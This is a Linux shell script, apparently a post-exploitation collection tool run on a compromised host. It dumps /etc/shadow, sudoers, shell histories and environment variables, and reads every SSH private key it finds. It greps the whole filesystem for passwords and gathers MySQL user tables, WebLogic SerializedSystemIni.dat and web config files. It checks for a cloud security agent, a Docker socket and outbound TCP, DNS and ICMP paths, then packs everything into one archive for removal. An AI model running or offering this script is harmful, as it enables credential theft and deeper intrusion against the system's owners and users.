dir_name="linuxfiles"
mkdir ${dir_name}
cd ${dir_name}
echo ----systemd-detect-virt----
systemd-detect-virt && systemd-detect-virt >> is_vm.txt

cat /etc/passwd | grep `whoami` > whoami.txt

echo "--history--"
echo "---------history--------" >> history.txt
history >> history.txt
for f in `find / -ipath "/root/*sh_history" -o -ipath "/home/*sh_history"  -type f  2>/dev/null`;do echo ---------$f-------->> history.txt&&cat $f>> history.txt;done

echo "--/etc/passwd--"
cat /etc/passwd > etc_passwd.txt

echo "--/etc/shadow--"
cat /etc/shadow > etc_shadow.txt

echo "--/etc/group--"
cat /etc/group > etc_group.txt

echo "--user.MYD--"
for f in `find / -ipath "*user.MYD"   -type f  2>/dev/null`;do echo ---------$f-------->> user_MYD.txt&&cat $f>> user_MYD.txt;done

echo "--last--"
last >> last.txt
lastlog >> last.txt

echo "--sudoers--"
cat /etc/sudoers > etc_sudoers.txt

echo "--env--"
env > env.txt

echo "--ps aux--"
ps aux > ps_aux.txt

echo "--Agent--"
cat ps_aux.txt |  grep -i "aliyun" && echo "aliyun_agent">> aliyun_agent.txt

echo "--network--"
echo 1 > /dev/tcp/8.8.8.8/53 && echo "----TCP can out network--------" >> network.txt
ping -nc 1 -w1 -W1 www.baidu.com  > ping.txt
grep -r "shifen" ping.txt && echo "----DNS can out network-----" >> network.txt
grep -r "ttl=" ping.txt && echo "------ICMP can out network-------" >> network.txt
cat /etc/hosts >> network.txt
cat /etc/resolv.conf >> network.txt
ip a >> network.txt
ifconfig >> network.txt
netstat -anutp >> network.txt
arp -an >> network.txt
route >> network.txt
iptables -L >> network.txt


echo "--crontab--"
crontab -l >> crontab.txt
ls -alh /var/spool/cron >> crontab.txt
ls -al /etc/ | grep cron >> crontab.txt
ls -al /etc/cron* >> crontab.txt
for f in `find / -ipath "/etc/*cron*" -o -ipath "/var/spool/*cron*" -type f  2>/dev/null`;do echo ---------$f-------->> crontab.txt&&cat $f>> crontab.txt;done

echo "--packegae list--"
dpkg -l >> packegae_list.txt
yum list | grep installed >> packegae_list.txt

echo "--services--"
service --status-all >> services.txt
cat /etc/services >> services.txt

echo "--startup--"
systemctl  list-unit-files |  grep enabl >> startup.txt

echo "--ssh key--"
for f in `find / -ipath "/home/*/.ssh/*" -o -ipath "/etc/ssh/ssh*" -o -ipath "/root/.ssh/*" -o -ipath "*/docker/*/.ssh/*" -o -ipath "*/docker/*/etc/ssh/ssh*"  -type f 2>/dev/null`;do echo ---------$f-------->>ssh_key.txt&&cat $f>>ssh_key.txt;done

echo "--docker.sock--"
if [ -f "/.dockerenv" ]; then
  find / -iname "docker.sock"  2>/dev/null >> docker_sock_in_docker.txt
fi

echo "--passwords--"
find / -type f  -iname "*history" -o -iname "*record" -o -iname "*.csv" -o -iname "*.bak" -o -iname "*.py" -o -iname "*.txt" -o -iname "*.pl" -o -iname "*.xml" -o -iname "*.md" -o -iname "*.config" -o -iname "*.php" -o -iname "*.conf" -o -iname "*.asp" -o -iname "*.java" -o -iname "*.groovy" -o -iname "*.jsp" -o -iname "*.aspx" -o -iname "*.ini" -o -iname "*.inc" -o -iname "*.reg" -o -iname "*.doc" -o -iname "*.docx" -o -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.pdf" -o -iname "*.sh" -o -iname "*.properties" -o -iname "*log" 2>/dev/null | grep -v '/lib/python\|/usr/lib/\|/usr/local/lib/\|__init__' |xargs grep -r -E "(password|passwd|pwd)(\s*[=:])" >> passwords.txt 2>/dev/null

find / -type f -iname "*sql" -o -iname  "*json" 2>/dev/null | grep -v '/lib/python\|/usr/lib/\|/usr/local/lib/\|__init__' | xargs grep -r -E "[\"'](password|passwd|pwd)[\"']" >> passwords.txt 2>/dev/null

echo "--collect SerializedSystemIni.dat--"
tar -zcvf SerializedSystemIni.tar.gz `find / -ipath '*/SerializedSystemIni.dat'  2>/dev/null` 2>/dev/null >/dev/null

echo "--collect *.sh file--"
tar -zcvf user_shell_file.tar.gz `find / -ipath '/root*.sh' -o -ipath '/home*.sh' 2>/dev/null` 2>/dev/null >/dev/null

echo "--collect config file--"
tar -zcvf config_file.tar.gz `find / -regextype posix-egrep -regex ".*/(web/|webapp|www|conf|weblogic|jetty|tomcat|resin|apache|orcale|php).*(xml|conf|yml|yaml|ini|cfg|properties)$" -type f  2>/dev/null| grep -v "/.gradle\|mime\|fonts\|temp" 2>/dev/null` 2>/dev/null >/dev/null

echo "--collect config script file--"
tar -zcvf config_script_file.tar.gz `find / -regextype posix-egrep -regex ".*/(config|db|data|conf|shell|setup|admin)[a-zA-Z0-9_]*\.(php|java|php.bak|py|pl|jsp|asp|aspx)$" -type f 2>/dev/null| grep -v "/usr/lib/\|/usr/local/lib/\|__init__"  2>/dev/null` 2>/dev/null >/dev/null

tar -zcvf compress.tar.gz *
